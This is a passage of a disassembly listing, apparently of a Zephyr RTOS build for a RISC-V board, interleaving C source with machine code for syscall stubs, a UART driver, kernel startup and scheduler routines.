8004430a:	03245063          	bge	s0,s2,8004432a <z_impl_zephyr_write_stdout+0x44>
		if (*(buf + i) == '\n') {
8004430e:	008984b3          	add	s1,s3,s0
80044312:	0004c703          	lbu	a4,0(s1)
80044316:	47a9                	li	a5,10
80044318:	fef711e3          	bne	a4,a5,800442fa <z_impl_zephyr_write_stdout+0x14>
			_stdout_hook('\r');
8004431c:	800477b7          	lui	a5,0x80047
80044320:	d247a783          	lw	a5,-732(a5) # 80046d24 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d25>
80044324:	4535                	li	a0,13
80044326:	9782                	jalr	a5
80044328:	bfc9                	j	800442fa <z_impl_zephyr_write_stdout+0x14>
	}
	return nbytes;
}
8004432a:	854a                	mv	a0,s2
8004432c:	40f2                	lw	ra,28(sp)
8004432e:	4462                	lw	s0,24(sp)
80044330:	44d2                	lw	s1,20(sp)
80044332:	4942                	lw	s2,16(sp)
80044334:	49b2                	lw	s3,12(sp)
80044336:	6105                	addi	sp,sp,32
80044338:	8082                	ret

8004433a <_write>:
	return z_impl_zephyr_read_stdin(buf, nbytes);
}
FUNC_ALIAS(_read, read, int);

int _write(int fd, const void *buf, int nbytes)
{
8004433a:	1141                	addi	sp,sp,-16
8004433c:	c606                	sw	ra,12(sp)
8004433e:	852e                	mv	a0,a1
	ARG_UNUSED(fd);

	return z_impl_zephyr_write_stdout(buf, nbytes);
80044340:	85b2                	mv	a1,a2
80044342:	3755                	jal	800442e6 <z_impl_zephyr_write_stdout>
}
80044344:	40b2                	lw	ra,12(sp)
80044346:	0141                	addi	sp,sp,16
80044348:	8082                	ret

8004434a <_kill>:
FUNC_ALIAS(_isatty, isatty, int);

int _kill(int i, int j)
{
	return 0;
}
8004434a:	4501                	li	a0,0
8004434c:	8082                	ret

8004434e <_getpid>:
FUNC_ALIAS(_kill, kill, int);

int _getpid(void)
{
	return 0;
}
8004434e:	4501                	li	a0,0
80044350:	8082                	ret

80044352 <_exit>:
	return 0;
}
FUNC_ALIAS(_fstat, fstat, int);

void _exit(int status)
{
80044352:	1141                	addi	sp,sp,-16
80044354:	c606                	sw	ra,12(sp)
	_write(1, "exit\n", 5);
80044356:	4615                	li	a2,5
80044358:	800465b7          	lui	a1,0x80046
8004435c:	39c58593          	addi	a1,a1,924 # 8004639c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004639d>
80044360:	4505                	li	a0,1
80044362:	3fe1                	jal	8004433a <_write>
	while (1) {
		;
80044364:	a001                	j	80044364 <_exit+0x12>

80044366 <_sbrk>:
void *_sbrk(int count)
{
#if CONFIG_NEWLIB_LIBC_ALIGNED_HEAP_SIZE
	void *ptr = heap_base + heap_sz;
#else
	void *ptr = _end + heap_sz;
80044366:	800477b7          	lui	a5,0x80047
8004436a:	dbc7a783          	lw	a5,-580(a5) # 80046dbc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dbd>
8004436e:	80049737          	lui	a4,0x80049
80044372:	68070713          	addi	a4,a4,1664 # 80049680 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80049681>
80044376:	00e786b3          	add	a3,a5,a4
#endif

	if ((heap_sz + count) < MAX_HEAP_SIZE) {
8004437a:	953e                	add	a0,a0,a5
8004437c:	800807b7          	lui	a5,0x80080
80044380:	40e78733          	sub	a4,a5,a4
80044384:	00e57763          	bgeu	a0,a4,80044392 <_sbrk+0x2c>
		heap_sz += count;
80044388:	800477b7          	lui	a5,0x80047
8004438c:	daa7ae23          	sw	a0,-580(a5) # 80046dbc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dbd>
		return ptr;
80044390:	a011                	j	80044394 <_sbrk+0x2e>
	} else {
		return (void *)-1;
80044392:	56fd                	li	a3,-1
	}
}
80044394:	8536                	mv	a0,a3
80044396:	8082                	ret

80044398 <uart_pulserain_rattlesnake_poll_out>:
static unsigned char uart_pulserain_rattlesnake_poll_out(struct device *dev,
					      unsigned char c)
{
    volatile unsigned int *uart = (unsigned int*)PULSERAIN_RATTLESNAKE_UART_BASE;
   
    while ((*uart) & 0x80000000){};
80044398:	200007b7          	lui	a5,0x20000
8004439c:	4b9c                	lw	a5,16(a5)
8004439e:	fe07cde3          	bltz	a5,80044398 <uart_pulserain_rattlesnake_poll_out>
        *uart = c;
800443a2:	200007b7          	lui	a5,0x20000
800443a6:	cb8c                	sw	a1,16(a5)
    while ((*uart) & 0x80000000){};
800443a8:	200007b7          	lui	a5,0x20000
800443ac:	4b9c                	lw	a5,16(a5)
800443ae:	fe07cde3          	bltz	a5,800443a8 <uart_pulserain_rattlesnake_poll_out+0x10>
  
    return c;
}
800443b2:	852e                	mv	a0,a1
800443b4:	8082                	ret

800443b6 <uart_pulserain_rattlesnake_poll_in>:

static int uart_pulserain_rattlesnake_poll_in(struct device *dev, unsigned char *c)
{
	*c = 0;
800443b6:	00058023          	sb	zero,0(a1)
	return 0;
}
800443ba:	4501                	li	a0,0
800443bc:	8082                	ret

800443be <uart_pulserain_rattlesnake_init>:
static int uart_pulserain_rattlesnake_init(struct device *dev)
{
	/* Nothing to do */

	return 0;
}
800443be:	4501                	li	a0,0
800443c0:	8082                	ret

800443c2 <z_sys_device_do_config_level>:
 * off and the next one begins.
 *
 * @param level init level to run.
 */
void z_sys_device_do_config_level(s32_t level)
{
800443c2:	1141                	addi	sp,sp,-16
800443c4:	c606                	sw	ra,12(sp)
800443c6:	c422                	sw	s0,8(sp)
800443c8:	c226                	sw	s1,4(sp)
800443ca:	84aa                	mv	s1,a0
		__device_APPLICATION_start,
		/* End marker */
		__device_init_end,
	};

	for (info = config_levels[level]; info < config_levels[level+1];
800443cc:	00251713          	slli	a4,a0,0x2
800443d0:	800467b7          	lui	a5,0x80046
800443d4:	3b878793          	addi	a5,a5,952 # 800463b8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800463b9>
800443d8:	97ba                	add	a5,a5,a4
800443da:	4380                	lw	s0,0(a5)
800443dc:	a011                	j	800443e0 <z_sys_device_do_config_level+0x1e>
								info++) {
800443de:	0431                	addi	s0,s0,12
	for (info = config_levels[level]; info < config_levels[level+1];
800443e0:	00148793          	addi	a5,s1,1
800443e4:	00279713          	slli	a4,a5,0x2
800443e8:	800467b7          	lui	a5,0x80046
800443ec:	3b878793          	addi	a5,a5,952 # 800463b8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800463b9>
800443f0:	97ba                	add	a5,a5,a4
800443f2:	439c                	lw	a5,0(a5)
800443f4:	00f47a63          	bgeu	s0,a5,80044408 <z_sys_device_do_config_level+0x46>
		int retval;
		struct device_config *device_conf = info->config;
800443f8:	401c                	lw	a5,0(s0)

		retval = device_conf->init(info);
800443fa:	43dc                	lw	a5,4(a5)
800443fc:	8522                	mv	a0,s0
800443fe:	9782                	jalr	a5
		if (retval != 0) {
80044400:	dd79                	beqz	a0,800443de <z_sys_device_do_config_level+0x1c>
			/* Initialization failed. Clear the API struct so that
			 * device_get_binding() will not succeed for it.
			 */
			info->driver_api = NULL;
80044402:	00042223          	sw	zero,4(s0)
80044406:	bfe1                	j	800443de <z_sys_device_do_config_level+0x1c>
		} else {
			z_object_init(info);
		}
	}
}
80044408:	40b2                	lw	ra,12(sp)
8004440a:	4422                	lw	s0,8(sp)
8004440c:	4492                	lw	s1,4(sp)
8004440e:	0141                	addi	sp,sp,16
80044410:	8082                	ret

80044412 <z_impl_device_get_binding>:

struct device *z_impl_device_get_binding(const char *name)
{
80044412:	1141                	addi	sp,sp,-16
80044414:	c606                	sw	ra,12(sp)
80044416:	c422                	sw	s0,8(sp)
80044418:	c226                	sw	s1,4(sp)
	/* Split the search into two loops: in the common scenario, where
	 * device names are stored in ROM (and are referenced by the user
	 * with CONFIG_* macros), only cheap pointer comparisons will be
	 * performed.  Reserve string comparisons for a fallback.
	 */
	for (info = __device_init_start; info != __device_init_end; info++) {
8004441a:	80047437          	lui	s0,0x80047
8004441e:	d4440413          	addi	s0,s0,-700 # 80046d44 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d45>
80044422:	a011                	j	80044426 <z_impl_device_get_binding+0x14>
80044424:	0431                	addi	s0,s0,12
80044426:	800477b7          	lui	a5,0x80047
8004442a:	d7478793          	addi	a5,a5,-652 # 80046d74 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d75>
8004442e:	00f40e63          	beq	s0,a5,8004444a <z_impl_device_get_binding+0x38>
		if ((info->driver_api != NULL) &&
80044432:	405c                	lw	a5,4(s0)
80044434:	dbe5                	beqz	a5,80044424 <z_impl_device_get_binding+0x12>
		    (info->config->name == name)) {
80044436:	401c                	lw	a5,0(s0)
80044438:	439c                	lw	a5,0(a5)
		if ((info->driver_api != NULL) &&
8004443a:	fea795e3          	bne	a5,a0,80044424 <z_impl_device_get_binding+0x12>
			return info;
		}
	}

	return NULL;
}
8004443e:	8522                	mv	a0,s0
80044440:	40b2                	lw	ra,12(sp)
80044442:	4422                	lw	s0,8(sp)
80044444:	4492                	lw	s1,4(sp)
80044446:	0141                	addi	sp,sp,16
80044448:	8082                	ret
8004444a:	84aa                	mv	s1,a0
	for (info = __device_init_start; info != __device_init_end; info++) {
8004444c:	80047437          	lui	s0,0x80047
80044450:	d4440413          	addi	s0,s0,-700 # 80046d44 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d45>
80044454:	a011                	j	80044458 <z_impl_device_get_binding+0x46>
80044456:	0431                	addi	s0,s0,12
80044458:	800477b7          	lui	a5,0x80047
8004445c:	d7478793          	addi	a5,a5,-652 # 80046d74 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d75>
80044460:	00f40b63          	beq	s0,a5,80044476 <z_impl_device_get_binding+0x64>
		if (info->driver_api == NULL) {
80044464:	405c                	lw	a5,4(s0)
80044466:	dbe5                	beqz	a5,80044456 <z_impl_device_get_binding+0x44>
		if (strcmp(name, info->config->name) == 0) {
80044468:	401c                	lw	a5,0(s0)
8004446a:	438c                	lw	a1,0(a5)
8004446c:	8526                	mv	a0,s1
8004446e:	90ffc0ef          	jal	ra,80040d7c <strcmp>
80044472:	f175                	bnez	a0,80044456 <z_impl_device_get_binding+0x44>
80044474:	b7e9                	j	8004443e <z_impl_device_get_binding+0x2c>
	return NULL;
80044476:	4401                	li	s0,0
80044478:	b7d9                	j	8004443e <z_impl_device_get_binding+0x2c>

8004447a <init_idle_thread>:

/* LCOV_EXCL_STOP */

#if defined(CONFIG_MULTITHREADING)
static void init_idle_thread(struct k_thread *thr, k_thread_stack_t *stack)
{
8004447a:	1101                	addi	sp,sp,-32
8004447c:	ce06                	sw	ra,28(sp)
8004447e:	cc22                	sw	s0,24(sp)
80044480:	842a                	mv	s0,a0
#ifdef CONFIG_SMP
	thr->base.is_idle = 1U;
#endif

	z_setup_new_thread(thr, stack,
80044482:	800467b7          	lui	a5,0x80046
80044486:	41078793          	addi	a5,a5,1040 # 80046410 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046411>
8004448a:	c23e                	sw	a5,4(sp)
8004448c:	4785                	li	a5,1
8004448e:	c03e                	sw	a5,0(sp)
80044490:	48bd                	li	a7,15
80044492:	4801                	li	a6,0
80044494:	4781                	li	a5,0
80044496:	4701                	li	a4,0
80044498:	800456b7          	lui	a3,0x80045
8004449c:	04e68693          	addi	a3,a3,78 # 8004504e <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x8004504f>
800444a0:	40000613          	li	a2,1024
800444a4:	766000ef          	jal	ra,80044c0a <z_setup_new_thread>
	thread->base.thread_state &= ~_THREAD_SUSPENDED;
}

static inline void z_mark_thread_as_started(struct k_thread *thread)
{
	thread->base.thread_state &= ~_THREAD_PRESTART;
800444a8:	00d44783          	lbu	a5,13(s0)
800444ac:	9bed                	andi	a5,a5,-5
800444ae:	00f406a3          	sb	a5,13(s0)
			  IDLE_STACK_SIZE, idle, NULL, NULL, NULL,
			  K_LOWEST_THREAD_PRIO, K_ESSENTIAL, IDLE_THREAD_NAME);
	z_mark_thread_as_started(thr);
}
800444b2:	40f2                	lw	ra,28(sp)
800444b4:	4462                	lw	s0,24(sp)
800444b6:	6105                	addi	sp,sp,32
800444b8:	8082                	ret

800444ba <prepare_multithreading>:
 *
 * @return N/A
 */
#ifdef CONFIG_MULTITHREADING
static void prepare_multithreading(struct k_thread *dummy_thread)
{
800444ba:	1101                	addi	sp,sp,-32
800444bc:	ce06                	sw	ra,28(sp)
800444be:	cc22                	sw	s0,24(sp)
800444c0:	ca26                	sw	s1,20(sp)
	 * debugging output if an exception should happen during kernel
	 * initialization.  However, don't waste effort initializing the
	 * fields of the dummy thread beyond those needed to identify it as a
	 * dummy thread.
	 */
	dummy_thread->base.user_options = K_ESSENTIAL;
800444c2:	4485                	li	s1,1
800444c4:	00950623          	sb	s1,12(a0)
	dummy_thread->base.thread_state = _THREAD_DUMMY;
800444c8:	009506a3          	sb	s1,13(a0)
	dummy_thread->mem_domain_info.mem_domain = 0;
#endif
#endif

	/* _kernel.ready_q is all zeroes */
	z_sched_init();
800444cc:	2d95                	jal	80044b40 <z_sched_init>
	 * - the main thread will be the one to run first
	 * - no other thread is initialized yet and thus their priority fields
	 *   contain garbage, which would prevent the cache loading algorithm
	 *   to work as intended
	 */
	_kernel.ready_q.cache = _main_thread;
800444ce:	800477b7          	lui	a5,0x80047
800444d2:	80047537          	lui	a0,0x80047
800444d6:	1d850413          	addi	s0,a0,472 # 800471d8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800471d9>
800444da:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
800444de:	d380                	sw	s0,32(a5)
#endif

	z_setup_new_thread(_main_thread, _main_stack,
800444e0:	800467b7          	lui	a5,0x80046
800444e4:	41878793          	addi	a5,a5,1048 # 80046418 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046419>
800444e8:	c23e                	sw	a5,4(sp)
800444ea:	c026                	sw	s1,0(sp)
800444ec:	4881                	li	a7,0
800444ee:	4801                	li	a6,0
800444f0:	4781                	li	a5,0
800444f2:	4701                	li	a4,0
800444f4:	800446b7          	lui	a3,0x80044
800444f8:	5ae68693          	addi	a3,a3,1454 # 800445ae <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800445af>
800444fc:	6605                	lui	a2,0x1
800444fe:	800475b7          	lui	a1,0x80047
80044502:	28058593          	addi	a1,a1,640 # 80047280 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047281>
80044506:	1d850513          	addi	a0,a0,472
8004450a:	2701                	jal	80044c0a <z_setup_new_thread>
8004450c:	00d44783          	lbu	a5,13(s0)
80044510:	0fb7f793          	andi	a5,a5,251
80044514:	00f406a3          	sb	a5,13(s0)
	return !((z_is_thread_prevented_from_running(thread)) != 0 ||
80044518:	8bed                	andi	a5,a5,27
8004451a:	eb99                	bnez	a5,80044530 <prepare_multithreading+0x76>
	return node->next != NULL;
8004451c:	800477b7          	lui	a5,0x80047
80044520:	1d878793          	addi	a5,a5,472 # 800471d8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800471d9>
80044524:	4f9c                	lw	a5,24(a5)
80044526:	c399                	beqz	a5,8004452c <prepare_multithreading+0x72>
80044528:	4781                	li	a5,0
8004452a:	a021                	j	80044532 <prepare_multithreading+0x78>
8004452c:	4785                	li	a5,1
8004452e:	a011                	j	80044532 <prepare_multithreading+0x78>
80044530:	4781                	li	a5,0
	return true;
}

static ALWAYS_INLINE void z_ready_thread(struct k_thread *thread)
{
	if (z_is_thread_ready(thread)) {
80044532:	ef85                	bnez	a5,8004456a <prepare_multithreading+0xb0>

	z_mark_thread_as_started(_main_thread);
	z_ready_thread(_main_thread);

#ifdef CONFIG_MULTITHREADING
	init_idle_thread(_idle_thread, _idle_stack);
80044534:	80047537          	lui	a0,0x80047
80044538:	16850413          	addi	s0,a0,360 # 80047168 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047169>
8004453c:	800485b7          	lui	a1,0x80048
80044540:	28058593          	addi	a1,a1,640 # 80048280 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80048281>
80044544:	16850513          	addi	a0,a0,360
80044548:	3f0d                	jal	8004447a <init_idle_thread>
	_kernel.cpus[0].idle_thread = _idle_thread;
8004454a:	800477b7          	lui	a5,0x80047
8004454e:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044552:	c7c0                	sw	s0,12(a5)
	list->head = (sys_dnode_t *)list;
80044554:	80047737          	lui	a4,0x80047
80044558:	26070713          	addi	a4,a4,608 # 80047260 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047261>
8004455c:	cf98                	sw	a4,24(a5)
	list->tail = (sys_dnode_t *)list;
8004455e:	cfd8                	sw	a4,28(a5)
		+ CONFIG_ISR_STACK_SIZE;
#endif

	initialize_timeouts();

}
80044560:	40f2                	lw	ra,28(sp)
80044562:	4462                	lw	s0,24(sp)
80044564:	44d2                	lw	s1,20(sp)
80044566:	6105                	addi	sp,sp,32
80044568:	8082                	ret
		z_add_thread_to_ready_q(thread);
8004456a:	80047537          	lui	a0,0x80047
8004456e:	1d850513          	addi	a0,a0,472 # 800471d8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800471d9>
80044572:	261d                	jal	80044898 <z_add_thread_to_ready_q>
80044574:	b7c1                	j	80044534 <prepare_multithreading+0x7a>

80044576 <switch_to_main_thread>:

static FUNC_NORETURN void switch_to_main_thread(void)
{
80044576:	1141                	addi	sp,sp,-16
80044578:	c606                	sw	ra,12(sp)
	__asm__ volatile ("csrrc %0, mstatus, %1"
8004457a:	4521                	li	a0,8
8004457c:	30053573          	csrrc	a0,mstatus,a0
#ifndef CONFIG_ARM
#ifdef CONFIG_TRACING
	sys_trace_thread_switched_out();
#endif
#endif
	ret = __swap(key);
80044580:	8921                	andi	a0,a0,8
80044582:	c47fb0ef          	jal	ra,800401c8 <__swap>

80044586 <z_bss_zero>:
{
80044586:	1141                	addi	sp,sp,-16
80044588:	c606                	sw	ra,12(sp)
	(void)memset(&__bss_start, 0,
8004458a:	80047537          	lui	a0,0x80047
8004458e:	d8850613          	addi	a2,a0,-632 # 80046d88 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d89>
80044592:	800477b7          	lui	a5,0x80047
80044596:	27878793          	addi	a5,a5,632 # 80047278 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047279>
8004459a:	40c78633          	sub	a2,a5,a2
8004459e:	4581                	li	a1,0
800445a0:	d8850513          	addi	a0,a0,-632
800445a4:	9e4fc0ef          	jal	ra,80040788 <memset>
}
800445a8:	40b2                	lw	ra,12(sp)
800445aa:	0141                	addi	sp,sp,16
800445ac:	8082                	ret

800445ae <bg_thread_main>:
{
800445ae:	1141                	addi	sp,sp,-16
800445b0:	c606                	sw	ra,12(sp)
	z_sys_device_do_config_level(_SYS_INIT_LEVEL_POST_KERNEL);
800445b2:	4509                	li	a0,2
800445b4:	3539                	jal	800443c2 <z_sys_device_do_config_level>
	PRINT_BOOT_BANNER();
800445b6:	80046537          	lui	a0,0x80046
800445ba:	3cc50513          	addi	a0,a0,972 # 800463cc <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800463cd>
800445be:	adfff0ef          	jal	ra,8004409c <printk>
	z_sys_device_do_config_level(_SYS_INIT_LEVEL_APPLICATION);
800445c2:	450d                	li	a0,3
800445c4:	3bfd                	jal	800443c2 <z_sys_device_do_config_level>
	z_init_static_threads();
800445c6:	25c9                	jal	80044c88 <z_init_static_threads>
	main();
800445c8:	a70ff0ef          	jal	ra,80043838 <main>
	_main_thread->base.user_options &= ~K_ESSENTIAL;
800445cc:	800477b7          	lui	a5,0x80047
800445d0:	1d878793          	addi	a5,a5,472 # 800471d8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800471d9>
800445d4:	00c7c703          	lbu	a4,12(a5)
800445d8:	9b79                	andi	a4,a4,-2
800445da:	00e78623          	sb	a4,12(a5)
} /* LCOV_EXCL_LINE ... because we just dumped final coverage data */
800445de:	40b2                	lw	ra,12(sp)
800445e0:	0141                	addi	sp,sp,16
800445e2:	8082                	ret

800445e4 <z_cstart>:
 * cleared/zeroed.
 *
 * @return Does not return
 */
FUNC_NORETURN void z_cstart(void)
{
800445e4:	7119                	addi	sp,sp,-128
800445e6:	de86                	sw	ra,124(sp)
800445e8:	dca2                	sw	s0,120(sp)
void k_cpu_idle(void);
void k_cpu_atomic_idle(unsigned int key);

static ALWAYS_INLINE void kernel_arch_init(void)
{
	_kernel.irq_stack =
800445ea:	80047437          	lui	s0,0x80047
800445ee:	24840413          	addi	s0,s0,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
800445f2:	800497b7          	lui	a5,0x80049
800445f6:	68078793          	addi	a5,a5,1664 # 80049680 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80049681>
800445fa:	c05c                	sw	a5,4(s0)

	/* perform any architecture-specific initialization */
	kernel_arch_init();

#ifdef CONFIG_MULTITHREADING
	struct k_thread dummy_thread = {
800445fc:	07000613          	li	a2,112
80044600:	4581                	li	a1,0
80044602:	850a                	mv	a0,sp
80044604:	984fc0ef          	jal	ra,80040788 <memset>
80044608:	4785                	li	a5,1
8004460a:	00f106a3          	sb	a5,13(sp)
# ifdef CONFIG_SCHED_CPU_MASK
		 .base.cpu_mask = -1,
# endif
	};

	_current = &dummy_thread;
8004460e:	00242423          	sw	sp,8(s0)
#ifdef CONFIG_USERSPACE
	z_app_shmem_bss_zero();
#endif

	/* perform basic hardware initialization */
	z_sys_device_do_config_level(_SYS_INIT_LEVEL_PRE_KERNEL_1);
80044612:	4501                	li	a0,0
80044614:	337d                	jal	800443c2 <z_sys_device_do_config_level>
	z_sys_device_do_config_level(_SYS_INIT_LEVEL_PRE_KERNEL_2);
80044616:	4505                	li	a0,1
80044618:	336d                	jal	800443c2 <z_sys_device_do_config_level>
#ifdef CONFIG_STACK_CANARIES
	__stack_chk_guard = z_early_boot_rand32_get();
#endif

#ifdef CONFIG_MULTITHREADING
	prepare_multithreading(&dummy_thread);
8004461a:	850a                	mv	a0,sp
8004461c:	3d79                	jal	800444ba <prepare_multithreading>
	switch_to_main_thread();
8004461e:	3fa1                	jal	80044576 <switch_to_main_thread>

80044620 <pended_on>:
static _wait_q_t *pended_on(struct k_thread *thread)
{
	__ASSERT_NO_MSG(thread->base.pended_on);

	return thread->base.pended_on;
}
80044620:	4508                	lw	a0,8(a0)
80044622:	8082                	ret

80044624 <reset_time_slice>:
{
80044624:	1141                	addi	sp,sp,-16
80044626:	c606                	sw	ra,12(sp)
	_current_cpu->slice_ticks = slice_time + z_clock_elapsed();
80044628:	c81ff0ef          	jal	ra,800442a8 <z_clock_elapsed>
8004462c:	800477b7          	lui	a5,0x80047
80044630:	dc47a703          	lw	a4,-572(a5) # 80046dc4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc5>
80044634:	953a                	add	a0,a0,a4
80044636:	800477b7          	lui	a5,0x80047
8004463a:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
8004463e:	cb88                	sw	a0,16(a5)
	z_set_timeout_expiry(slice_time, false);
80044640:	4581                	li	a1,0
80044642:	853a                	mv	a0,a4
80044644:	0bf000ef          	jal	ra,80044f02 <z_set_timeout_expiry>
}
80044648:	40b2                	lw	ra,12(sp)
8004464a:	0141                	addi	sp,sp,16
8004464c:	8082                	ret

8004464e <z_is_t1_higher_prio_than_t2>:
	if (t1->base.prio < t2->base.prio) {
8004464e:	00e50703          	lb	a4,14(a0)
80044652:	00e58783          	lb	a5,14(a1)
80044656:	00f74463          	blt	a4,a5,8004465e <z_is_t1_higher_prio_than_t2+0x10>
	return false;
8004465a:	4501                	li	a0,0
8004465c:	8082                	ret
		return true;
8004465e:	4505                	li	a0,1
}
80044660:	8082                	ret

80044662 <k_sched_time_slice_set>:
{
80044662:	1141                	addi	sp,sp,-16
80044664:	c606                	sw	ra,12(sp)
80044666:	c422                	sw	s0,8(sp)
80044668:	c226                	sw	s1,4(sp)
8004466a:	c04a                	sw	s2,0(sp)
8004466c:	892a                	mv	s2,a0
8004466e:	84ae                	mv	s1,a1
	LOCKED(&sched_spinlock) {
80044670:	4781                	li	a5,0
80044672:	4421                	li	s0,8
80044674:	30043473          	csrrc	s0,mstatus,s0
#endif

#ifdef SPIN_VALIDATE
	z_spin_lock_set_owner(l);
#endif
	return k;
80044678:	8821                	andi	s0,s0,8
8004467a:	eb9d                	bnez	a5,800446b0 <k_sched_time_slice_set+0x4e>
		_current_cpu->slice_ticks = 0;
8004467c:	800477b7          	lui	a5,0x80047
80044680:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044684:	0007a823          	sw	zero,16(a5)
		CONFIG_SYS_CLOCK_TICKS_PER_SEC);
#else
	/* simple division keeps precision */
	s32_t ms_per_tick = MSEC_PER_SEC / CONFIG_SYS_CLOCK_TICKS_PER_SEC;

	return (s32_t)ceiling_fraction(ms, ms_per_tick);
80044688:	00990793          	addi	a5,s2,9
8004468c:	4729                	li	a4,10
8004468e:	02e7c7b3          	div	a5,a5,a4
		slice_time = z_ms_to_ticks(slice);
80044692:	80047737          	lui	a4,0x80047
80044696:	dcf72223          	sw	a5,-572(a4) # 80046dc4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc5>
		slice_max_prio = prio;
8004469a:	800477b7          	lui	a5,0x80047
8004469e:	dc97a023          	sw	s1,-576(a5) # 80046dc0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc1>
		reset_time_slice();
800446a2:	3749                	jal	80044624 <reset_time_slice>
			  : "=r" (mstatus)
			  : "r" (key & SOC_MSTATUS_IEN)
800446a4:	00847793          	andi	a5,s0,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
800446a8:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&sched_spinlock) {
800446ac:	4785                	li	a5,1
800446ae:	b7f1                	j	8004467a <k_sched_time_slice_set+0x18>
}
800446b0:	40b2                	lw	ra,12(sp)
800446b2:	4422                	lw	s0,8(sp)
800446b4:	4492                	lw	s1,4(sp)
800446b6:	4902                	lw	s2,0(sp)
800446b8:	0141                	addi	sp,sp,16
800446ba:	8082                	ret

800446bc <z_unpend_thread_no_timeout>:

	return ret;
}

ALWAYS_INLINE void z_unpend_thread_no_timeout(struct k_thread *thread)
{
800446bc:	1141                	addi	sp,sp,-16
800446be:	c606                	sw	ra,12(sp)
800446c0:	c422                	sw	s0,8(sp)
800446c2:	c226                	sw	s1,4(sp)
800446c4:	842a                	mv	s0,a0
	LOCKED(&sched_spinlock) {
800446c6:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
800446c8:	44a1                	li	s1,8
800446ca:	3004b4f3          	csrrc	s1,mstatus,s1
800446ce:	88a1                	andi	s1,s1,8
800446d0:	e385                	bnez	a5,800446f0 <z_unpend_thread_no_timeout+0x34>
		_priq_wait_remove(&pended_on(thread)->waitq, thread);
800446d2:	8522                	mv	a0,s0
800446d4:	37b1                	jal	80044620 <pended_on>
800446d6:	85a2                	mv	a1,s0
800446d8:	2875                	jal	80044794 <z_priq_dumb_remove>
	thread->base.thread_state &= ~_THREAD_PENDING;
800446da:	00d44783          	lbu	a5,13(s0)
800446de:	9bf5                	andi	a5,a5,-3
800446e0:	00f406a3          	sb	a5,13(s0)
			  : "r" (key & SOC_MSTATUS_IEN)
800446e4:	0084f793          	andi	a5,s1,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
800446e8:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&sched_spinlock) {
800446ec:	4785                	li	a5,1
800446ee:	b7cd                	j	800446d0 <z_unpend_thread_no_timeout+0x14>
		z_mark_thread_as_not_pending(thread);
	}

	thread->base.pended_on = NULL;
800446f0:	00042423          	sw	zero,8(s0)
}
800446f4:	40b2                	lw	ra,12(sp)
800446f6:	4422                	lw	s0,8(sp)
800446f8:	4492                	lw	s1,4(sp)
800446fa:	0141                	addi	sp,sp,16
800446fc:	8082                	ret

800446fe <z_reschedule>:
		return 0;
	}
	_current_cpu->swap_ok = 0;
#endif

	return !z_is_in_isr();
800446fe:	800477b7          	lui	a5,0x80047
80044702:	2487a783          	lw	a5,584(a5) # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
}

void z_reschedule(struct k_spinlock *lock, k_spinlock_key_t key)
{
	if (resched()) {
80044706:	c789                	beqz	a5,80044710 <z_reschedule+0x12>
			  : "r" (key & SOC_MSTATUS_IEN)
80044708:	89a1                	andi	a1,a1,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
8004470a:	3005a5f3          	csrrs	a1,mstatus,a1
8004470e:	8082                	ret
{
80044710:	1141                	addi	sp,sp,-16
80044712:	c606                	sw	ra,12(sp)
80044714:	852e                	mv	a0,a1
80044716:	ab3fb0ef          	jal	ra,800401c8 <__swap>
		z_swap(lock, key);
	} else {
		k_spin_unlock(lock, key);
	}
}
8004471a:	40b2                	lw	ra,12(sp)
8004471c:	0141                	addi	sp,sp,16
8004471e:	8082                	ret

80044720 <z_reschedule_irqlock>:
	return !z_is_in_isr();
80044720:	800477b7          	lui	a5,0x80047
